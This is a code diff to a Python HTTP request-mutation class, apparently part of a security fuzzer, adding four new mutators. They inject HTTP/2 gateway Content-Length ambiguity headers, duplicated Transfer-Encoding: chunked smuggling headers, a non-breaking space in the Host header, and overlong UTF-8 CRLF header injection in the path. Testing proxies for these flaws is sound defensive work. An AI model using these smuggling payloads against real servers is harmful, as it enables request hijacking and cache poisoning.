@@ -121,8 +121,17 @@ class VectorPermutator:
             self._mutate_head_range_gadget,
         ]
 
+    def get_h2_desync_mutators(self) -> List[Any]:
+        """Returns the specialized catalog of HTTP/2 and Unicode gateway translation mutators."""
+        return [
+            self._mutate_h2_cl_gateway_translation,
+            self._mutate_h2_te_chunked_smuggling,
+            self._mutate_unicode_non_breaking_space,
+            self._mutate_utf8_overlong_crlf,
+        ]
+
     def get_terminator_mutators(self) -> List[Any]:
-        """Returns the complete catalog of 32 protocol terminator, framing & CRLF-RHI mutators."""
+        """Returns the complete catalog of 36 protocol terminator, framing, CRLF-RHI & H2 gateway mutators."""
         return [
             self._mutate_path_nul,
             self._mutate_path_asterisk_gadget,
@@ -157,6 +166,11 @@ class VectorPermutator:
             self._mutate_crlf_0_cl_connection_lock,
             self._mutate_crlf_expect_100_tunnel,
             self._mutate_head_range_gadget,
+            # HTTP/2 Gateway & Unicode Normalization Mutators
+            self._mutate_h2_cl_gateway_translation,
+            self._mutate_h2_te_chunked_smuggling,
+            self._mutate_unicode_non_breaking_space,
+            self._mutate_utf8_overlong_crlf,
         ]
 
     def combine_triggers(self, probe_a: Dict[str, Any], probe_b: Dict[str, Any]) -> Optional[Dict[str, Any]]:
@@ -512,5 +526,34 @@ class VectorPermutator:
                     mutated_req = mutated_req.replace("\r\n\r\n", f"\r\n{range_hdr}\r\n", 1)
                 return mutated_req, "head_range_arbitrary_overread_gadget"
         return req, ""
+
+    def _mutate_h2_cl_gateway_translation(self, req: str) -> Tuple[str, str]:
+        """Injects HTTP/2 to HTTP/1.1 gateway translation Content-Length ambiguity headers."""
+        if "\r\n\r\n" in req and "X-H2-Trigger:" not in req:
+            h2_headers = "X-H2-Gateway-Downgrade: 1\r\nX-H2-Stream-Id: 1\r\nContent-Length: 0\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{h2_headers}\r\n", 1), "h2_cl_gateway_translation_desync"
+        return req, ""
+
+    def _mutate_h2_te_chunked_smuggling(self, req: str) -> Tuple[str, str]:
+        """Injects illegal HTTP/2 Transfer-Encoding chunked header to test reverse proxy gateway translation."""
+        if "\r\n\r\n" in req and "X-H2-TE:" not in req:
+            h2_te = "X-H2-TE: chunked\r\nTransfer-Encoding: chunked\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{h2_te}\r\n", 1), "h2_te_chunked_gateway_smuggling"
+        return req, ""
+
+    def _mutate_unicode_non_breaking_space(self, req: str) -> Tuple[str, str]:
+        """Replaces ASCII space delimiter with U+00A0 NO-BREAK SPACE to test Unicode normalization leniency."""
+        if "\r\nHost: " in req:
+            return req.replace("\r\nHost: ", "\r\nHost:\xc2\xa0", 1), "dirty_unicode_non_breaking_space_delimiter"
+        return req, ""
+
+    def _mutate_utf8_overlong_crlf(self, req: str) -> Tuple[str, str]:
+        """Injects 2-byte overlong UTF-8 representations of CR (0xC0 0x8D) and LF (0xC0 0x8A) (RFC 3629)."""
+        pattern = re.compile(r"^(GET|POST)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
+        if pattern.search(req):
+            overlong_path = "/%c0%8d%c0%8aX-Injected-Overlong:%201"
+            return pattern.sub(rf"\1 {overlong_path} \2", req, count=1), "dirty_utf8_overlong_crlf_normalization"
+        return req, ""
+
 
 
